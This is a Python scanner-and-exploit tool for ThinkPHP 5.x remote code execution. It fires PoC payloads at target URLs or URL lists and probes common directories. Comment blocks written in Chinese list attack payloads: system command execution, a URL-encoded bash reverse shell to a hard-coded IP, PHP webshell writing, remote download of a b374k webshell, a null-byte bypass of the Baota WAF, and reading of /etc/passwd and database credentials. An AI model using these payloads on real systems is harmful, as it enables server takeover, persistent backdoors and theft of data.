#!/usr/bin/env python3
# encoding:utf8
import argparse
import requests
from urllib.parse import parse_qs
requests.packages.urllib3.disable_warnings()

'''
漏洞时间：
2018年12月10日

影响版本：
ThinkPHP v5.0系列 <= 5.0.23
ThinkPHP v5.1系列 <= 5.1.30
5.0.0   否   无需开启debug
5.0.1   否   无需开启debug
5.0.2   否   无需开启debug
5.0.3   否   无需开启debug
5.0.4   否   无需开启debug
5.0.5   否   无需开启debug
5.0.6   否   无需开启debug
5.0.7   否   无需开启debug
5.0.8   是   无需开启debug
5.0.9   是   无需开启debug
5.0.10  是   无需开启debug 从此版本开始默认debug=false
5.0.11  是   无需开启debug
5.0.12  是   无需开启debug
5.0.13  是   需开启debug，有captcha路由时无视debug
5.0.14  是   需开启debug
5.0.15  是   需开启debug
5.0.16  是   需开启debug
5.0.17  是   需开启debug
5.0.18  是   需开启debug
5.0.19  是   需开启debug
5.0.20  否   无
5.0.21  是   需开启debug
5.0.22  是   需开启debug
5.0.23  是   需开启debug
'''

__prog__ = 'Fuck-TP'
__version__ = '1.0'
__author__ = 'whois'


blue = '\033[94m'
red = '\033[31m'
cyan = '\033[96m'
end  = '\033[0m'

banner = blue + '''
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM''' + red + '''
   ___           _        _____  ___ 
  / __\   _  ___| | __   /__   \/ _ \\
 / _\| | | |/ __| |/ /     / /\/ /_)/
/ /  | |_| | (__|   <     / / / ___/ 
\/    \__,_|\___|_|\_\    \/  \/      
                                  ''' + cyan + '''
                              Fuck-TP Ver.{0}
                              Update 20200121
                              Coded by whois'''.format(__version__) + blue + ''' 
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM\n''' + end


think_list = '''
├── LICENSE.txt
├── README.md
├── application
│   ├── command.php
│   ├── common.php
│   ├── config.php
│   ├── database.php
│   ├── demo
│   │   ├── common.php
│   │   ├── config.php
│   │   ├── controller
│   │   ├── model
│   │   └── view
│   ├── extra
│   │   └── queue.php
│   ├── index
│   │   └── controller
│   ├── route.php
│   └── tags.php
├── build.php
├── composer.json
├── composer.lock
├── extend
├── public
│   ├── 1.php
│   ├── favicon.ico
│   ├── index.php
│   ├── robots.txt
│   ├── router.php
│   ├── static
│   └── xxx.php
├── runtime
│   └── log
│       └── 201907
├── think
├── thinkphp
│   ├── CONTRIBUTING.md
│   ├── LICENSE.txt
│   ├── README.md
│   ├── base.php
│   ├── codecov.yml
│   ├── composer.json
│   ├── console.php
│   ├── convention.php
│   ├── helper.php
│   ├── lang
│   │   └── zh-cn.php
│   ├── library
│   │   ├── think
│   │   └── traits
│   ├── logo.png
│   ├── phpunit.xml
│   ├── start.php
│   └── tpl
│       ├── default_index.tpl
│       ├── dispatch_jump.tpl
│       ├── page_trace.tpl
│       └── think_exception.tpl
└── vendor
    ├── autoload.php
    ├── composer
    │   ├── ClassLoader.php
    │   ├── LICENSE
    │   ├── autoload_classmap.php
    │   ├── autoload_files.php
    │   ├── autoload_namespaces.php
    │   ├── autoload_psr4.php
    │   ├── autoload_real.php
    │   ├── autoload_static.php
    │   └── installed.json
    ├── topthink
    │   ├── think-captcha
    │   ├── think-helper
    │   ├── think-image
    │   ├── think-installer
    │   ├── think-migration
    │   ├── think-mongo
    │   ├── think-oracle
    │   ├── think-queue
    │   └── think-worker
    └── workerman
        └── workerman
'''

'''
测试版本：
    5.0.7-5.0.13

执行命令：
    _method=__construct&method=get&filter[]=system&get[]=whoami

bash反弹：url编码
    %62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%35%32%2e%32%32%39%2e%31%37%30%2e%34%35%2f%38%38%20%30%3e%26%31

写马：
    _method=__construct&method=get&filter[]=assert&filter[]=file_put_contents('g0d.php','<?php assert($_REQUEST[0]);?>')&server=-1

    base64编码后
    _method=__construct&filter[]=assert&get[]=file_put_contents('g0d.php',base64_decode('PD9waHAgYXNzZXJ0KCRfUkVRVUVTVFswXSk7Pz4='));
    
    注意windows写马的^<转义

远程下载：
    _method=__construct&filter[]=assert&get[]=file_put_contents('content.php',file_get_contents('http://1.1.1.1/b374k.php'));

    远程下载+base64
    _method=__construct&method=get&filter[]=assert&get[]=file_put_contents('content.php',file_get_contents(base64_decode('aHR0cDovLzEuMS4xLjEvYjM3NGsucGhw')));

    copy方法
    _method=__construct&filter[]=assert&get[]=copy('http://1.1.1.1:88/1.t,'0.php');

宝塔waf绕过:
    使用00截断
    file_put_con%00tents
    _method=__construct&method=get&filter[]=call_user_func&get[]=file_put_contents%00('content.php',file_get_contents%00('aaa'));


php7中assert函数不能使用，并且禁用命令函数，
    1. 包含执行：
        _method=__construct&method=get&filter[]=think\__include_file&server[]=phpinfo&get[]=/www/wwwroot/site/public/robots.txt
        

        _method=__construct&method=get&filter[]=call_user_func&server[]=phpinfo&get[]=<?php eval($_POST['x'])?>
        _method=__construct&method=get&filter[]=think\__include_file&server[]=phpinfo&get[]=../data/runtime/log/201901/21.log&x=phpinfo();
        
    2. 反序列化

    3. 利用变量覆盖，覆盖全局变量

'''
POC_POST1 = ["", "_method=__construct&method=get&filter[]=call_user_func&get[]=phpinfo"]
POC_POST2 = ["", "_method=__construct&method=get&filter[]=assert&get[]=phpinfo()"]


'''
测试版本：
    5.0.13
    有captcha路由时无需debug=true

命令执行
    EXP_POST = ["?s=index/index", "s=whoami&_method=__construct&method=&filter[]=system"]

poc
    POST ?s=captcha/calc
    _method=__construct&filter[]=system&method=GET

'''
POC_POST3 = ["?s=index/index", "_method=__construct&method=&filter[]=call_user_func&s=phpinfo"]


'''
测试版本：
    5.0.20-23 5.0.x
    debug模式：  public/index.php
    Nodebug模式：public/index.php?s=captcha   需要一个路由

执行命令：
    ?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id

    完整版非debug模式
    index.php?s=captcha
    _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=whoami

    _method=__construct&filter[]=system&method=get&get[]=whoami
    
写入：
    ?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=god.php&vars[1][]=%3c%3f%70%68%70%20%65%76%61%6c%28%24%5f%52%45%51%55%45%53%54%5b%31%5d%29%3b%3f%3e

    ?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=file_put_contents('content.php',file_get_contents('http://1.1.1.1/1.txt'));

    ?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][]=copy('http://1.1.1.1/1.txt,'content.php')

包含：
    ?s=index/thinkLang/load&file=../../test.jpg    
    ?s=index/thinkConfig/load&file=../../t.php     
    
    获取配置信息
    ?s=index/thinkconfig/get&name=database.username  
'''
POC_GET1 = r"?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
POC_POST4 = ["", "_method=__construct&filter[]=call_user_func&method=get&server[REQUEST_METHOD]=phpinfo"]
POC_POST5 = ["?s=captcha", "_method=__construct&filter[]=call_user_func&method=get&server[REQUEST_METHOD]=phpinfo"]


'''
测试版本：
    thinkphp 5
'''
POC_GET2 = r"?s=index/\think\View/display&content=%22%3C?%3E%3C?php%20phpinfo();?%3E&data=1"


'''
测试版本:
    5.1.*

执行命令：
    ?s=index/\think\Request/input&filter=system&data=id

    ?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id

写入：
    s=index/\think\template\driver\file/write&cacheFile=shell.php&content=%3C?php%20phpinfo();?%3E
'''
POC_GET3 = r"?s=index/\think\Request/input&filter=phpinfo&data=1"

# 测试thinkphp5.0.x
POC_GET4 = r"?s=index/\think\view\driver\Php/display&content=%3C?php%20phpinfo();?%3E"
POC_GET5 = r"?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
POC_GET6 = r"?s=index/think\request/input?data[]=phpinfo()&filter=assert"


'''
测试版本：
    5.1.7-5.1.32
'''
# POC_POST = ["", "c=system&f=whoami&_method=filter"]

'''
文件包含
    _method=__construct&method=get&filter[]=think\__include_file&server[]=phpinfo&get[]=/etc/passwd
    _method=__construct&method=get&filter[]=think\__include_file&server[]=phpinfo&get[]=/var/www/1.jpg
'''
POC_POST6 = ["", "_method=__construct&method=get&filter[]=think\__include_file&server[]=phpinfo&get[]=PHP Version"]

poc_get_list = [POC_GET1, POC_GET2, POC_GET3, POC_GET4, POC_GET5, POC_GET6]
poc_post_list = [POC_POST1, POC_POST2, POC_POST3, POC_POST4, POC_POST5, POC_POST6]

tp5_log = "/runtime/log/201911/13.log"
tp3_log = "/Application/Runtime/Logs/Home/19_12_24.log"

dir_list = [tp3_log, tp5_log, '/thinkphp', '/public', '/runtime', '/admin', '/admin.php']
result = []


def poc(url):

    header = {"Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3", "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7", "X-Forwarded-For": "127.0.0.1", "Connection": "close", "Content-Type": "application/x-www-form-urlencoded"}

    proxy = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080',
    }

    s = requests.session()
    s.headers = header
    s.verify = False
    s.proxies = proxy
    s.timeout = 15

    print("[M] Tesing " + url)
    for p in poc_post_list:
        base_url = url + '/' + p[0]
        # print(base_url)
        url2data = { key:parse_qs(p[1])[key][0] for key in parse_qs(p[1]) }

        try:
            r = s.post(base_url, data=url2data)
            if "PHP Version" in r.text:
                print(blue + "[+] Vuln -> " + red + str(p) + end)
                result.append(base_url)
        except Exception as e:
            print(e)
            pass

    for g in poc_get_list:
        base_url = url + '/' + g
        # print(base_url)
        try:
            r = s.get(base_url)
            if "PHP Version" in r.text:
                print(blue + "[+] Vuln -> " + red + base_url + end)
                result.append(base_url)
        except Exception as e:
            print(e)
            pass

    print("[M] Run dirmap")
    for d in dir_list:
        base_url = url.split('/')[0] + "//" + url.split('/')[2] + d
        try:
            r = s.get(base_url)

            if r.status_code not in [404, 500]:
                print(cyan + "[+] " + str(r.status_code) + "\t" + base_url + "\t" + str(len(r.content)))
        except Exception as e:
            print(e)
            pass

    print("\n")


def save(output_file, content):
    try:
        with open(output_file, 'a') as f:
            f.write(str(content))
    except:
        pass


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        usage='Tpscan -u http://think.com',
        description="Thinkphp RCE Scan Tool",
    )

    parser.add_argument("-u", "--url", dest="url",
                        help="Target URL")
    parser.add_argument("-f", "--file", dest="file",
                        help="Target File")
    # parser.add_argument("-e", "--exit", dest="exit",
    #                    action='store_true', default=False, help="Exit when a Vul is found")

    parser.add_argument("-o", "--output", dest="output",)
    parser.add_argument("-l", "--list", dest="list",
                        action='store_true', default=False, help="List thinkphp directory")

    args = parser.parse_args()

    if args.url is None and args.file is None:
        print(banner)
        parser.print_help()

    if args.url:
        poc(args.url)
        if args.output:
            save(args.output, result)

    if args.file:
        with open(args.file, 'r') as f:
            for line in f.readlines():
                poc(line.rstrip())
                
    if args.list:
        print(think_list)
